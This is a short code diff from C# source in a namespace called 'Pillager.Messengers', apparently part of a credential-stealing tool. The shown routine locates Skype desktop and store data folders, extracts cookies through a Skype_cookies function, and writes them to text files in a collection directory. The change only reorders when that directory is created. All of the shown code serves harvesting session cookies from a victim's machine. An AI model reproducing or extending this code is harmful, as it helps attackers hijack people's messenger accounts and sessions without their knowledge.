@@ -55,10 +55,11 @@ namespace Pillager.Messengers
             try
             {
                 if (!Directory.Exists(MessengerPaths[0]) && !Directory.Exists(MessengerPaths[1])) return;
-                string savepath = Path.Combine(path, MessengerName);
-                Directory.CreateDirectory(savepath);
                 string Desktop = Skype_cookies(MessengerPaths[0]);
                 string Store = Skype_cookies(MessengerPaths[1]);
+                if (string.IsNullOrEmpty(Desktop) && string.IsNullOrEmpty(Store)) return;
+                string savepath = Path.Combine(path, MessengerName);
+                Directory.CreateDirectory(savepath);
                 if (!String.IsNullOrEmpty(Desktop)) File.WriteAllText(Path.Combine(savepath, MessengerName + "_Desktop.txt"), Desktop);
                 if (!String.IsNullOrEmpty(Store)) File.WriteAllText(Path.Combine(savepath, MessengerName + "_Store.txt"), Store);
             }
